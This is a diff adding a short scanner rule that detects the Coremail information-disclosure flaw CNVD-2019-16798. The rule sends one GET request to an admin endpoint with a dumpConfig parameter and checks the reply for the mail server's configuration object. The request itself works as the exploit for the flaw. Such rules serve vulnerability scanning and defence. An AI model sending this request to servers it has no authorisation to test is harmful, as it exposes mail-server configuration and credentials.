@@ -1,0 +1,12 @@
+expression: r0()
+id: CNVD-2019-16798
+info:
+  author: cc_ci(https://github.com/cc8ci)
+  name: Coremail Information Disclosure
+  severity: high
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(bytes("<object name=\"cm_md_db\">"))
+    request:
+      method: GET
+      path: /mailsms/s?func=ADMIN:appState&dumpConfig=/
